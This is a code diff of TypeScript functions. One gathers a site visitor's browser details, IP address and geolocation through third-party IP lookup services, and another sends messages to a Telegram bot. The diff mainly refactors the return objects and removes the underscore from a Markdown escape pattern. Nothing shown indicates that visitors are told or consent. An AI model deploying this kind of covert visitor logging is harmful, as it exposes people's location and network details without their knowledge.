@@ -13,7 +13,7 @@ export interface TelemetryData {
 }
 
 export async function gatherVisitorTelemetry(): Promise<TelemetryData> {
-  const data: TelemetryData = {
+  const baseData = {
     userAgent: navigator.userAgent,
     timestamp: new Date().toLocaleTimeString("en-US", { hour12: true }),
     screenWidth: window.screen.width,
@@ -25,12 +25,14 @@ export async function gatherVisitorTelemetry(): Promise<TelemetryData> {
     if (res.ok) {
       const ipData = await res.json();
       if (ipData && ipData.success !== false) {
-        data.ip = ipData.ip;
-        data.city = ipData.city;
-        data.region = ipData.region;
-        data.country = ipData.country;
-        data.org = ipData.org || ipData.isp;
-        return data;
+        return {
+          ...baseData,
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country,
+          org: ipData.org || ipData.isp,
+        };
       }
     }
     throw new Error("Primary fetch fallback required");
@@ -39,22 +41,26 @@ export async function gatherVisitorTelemetry(): Promise<TelemetryData> {
       const backupRes = await fetch("https://api.ipify.org?format=json");
       if (backupRes.ok) {
         const { ip } = await backupRes.json();
-        data.ip = ip;
         const geoRes = await fetch(`https://ipwhois.app/json/${ip}`);
         if (geoRes.ok) {
           const geoData = await geoRes.json();
-          data.city = geoData.city;
-          data.region = geoData.region;
-          data.country = geoData.country;
-          data.org = geoData.org || geoData.isp;
+          return {
+            ...baseData,
+            ip: geoData.ip || ip,
+            city: geoData.city,
+            region: geoData.region,
+            country: geoData.country,
+            org: geoData.org || geoData.isp,
+          };
         }
+        return { ...baseData, ip };
       }
     } catch (e) {
       console.warn("Network boundaries telemetry lookup bypassed.");
     }
   }
 
-  return data;
+  return baseData;
 }
 
 export async function transmitTelegramPayload(
@@ -73,7 +79,7 @@ export async function transmitTelegramPayload(
   }
 
   try {
-    const escapedMessage = message.replace(/([_\[\]()~>#+\-=|{}.!])/g, "\\$1");
+    const escapedMessage = message.replace(/([\[\]()~>#+\-=|{}.!])/g, "\\$1");
     const response = await fetch(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
